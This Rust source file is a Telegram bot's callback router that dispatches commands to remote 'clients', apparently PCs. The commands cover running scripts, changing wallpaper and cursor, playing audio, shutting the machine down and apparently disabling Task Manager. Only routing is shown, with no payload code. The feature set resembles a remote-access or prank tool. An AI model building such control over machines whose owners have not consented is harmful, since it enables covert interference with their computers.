pub mod router {
    pub mod callbacks {
        use std::sync::Arc;
        use teloxide::prelude::{CallbackQuery, ResponseResult};
        use teloxide::Bot;
        use tokio::sync::Mutex;

        use crate::app::app::AppState;
        use crate::telegram::callbacks::audio::{handle_open_audio, handle_play_audio};
        use crate::telegram::callbacks::control_pc::{handle_open_control_pc, handle_set_volume, handle_shutdown_pc, handle_tskmngr_off};
        use crate::telegram::callbacks::dialogs::{start_cursor_dialog, start_notification_dialog, start_wallpaper_dialog};
        use crate::telegram::callbacks::scripts::{handle_open_scripts, handle_run_script};
        use crate::telegram::callbacks::utils::utils::{show_clients, RequestHandlerData};
        use crate::telegram::dialogs::change_cursor::change_cursor::ChangeCursorDialogue;
        use crate::telegram::dialogs::change_wallpaper::change_wallpaper::ChangeWallpaperDialogue;
        use crate::telegram::dialogs::send_notify_dialog::notify_dialog::NotificationEditorDialogue;

        // Main callback router
        pub async fn clients_buttons_callback_handler(
            bot: Bot,
            q: CallbackQuery, 
            state: Arc<Mutex<AppState>>,
            notify_dialog: NotificationEditorDialogue,
            change_wallpaper: ChangeWallpaperDialogue,
            change_cursor: ChangeCursorDialogue,
        ) -> ResponseResult<()> {
            let request_data = RequestHandlerData {
                bot,
                q,
                state,
                notify_dialog,
                change_wallpaper,
                change_cursor,
            };
            if let Some(data) = &request_data.q.data {
                let (command, _args) = data.split_once('|').unwrap_or((data, ""));

                let _ = match command {
                    "open_client" => crate::telegram::callbacks::open_client::handler::f(&request_data).await,
                    "send_message" => start_notification_dialog(&request_data).await,
                    "change_cursor" => start_cursor_dialog(&request_data).await,
                    "change_wallpaper" => start_wallpaper_dialog(&request_data).await,
                    "open_scripts" => handle_open_scripts(&request_data).await,
                    "run_script" => handle_run_script(&request_data).await,
                    "audio" => handle_open_audio(&request_data).await,
                    "pl_au" => handle_play_audio(&request_data).await,
                    "pc_c" => handle_open_control_pc(&request_data).await,
                    "off_tskmngr" => handle_tskmngr_off(&request_data).await,
                    "set_volume" => handle_set_volume(&request_data).await,
                    "shutdown_pc" => handle_shutdown_pc(&request_data).await,

                    "show_clients" => {
                        show_clients(&request_data).await;
                        Ok(())
                    },

                    _ => {
                        Ok(())
                    }
                };
            }

            Ok(())
        }
    }
}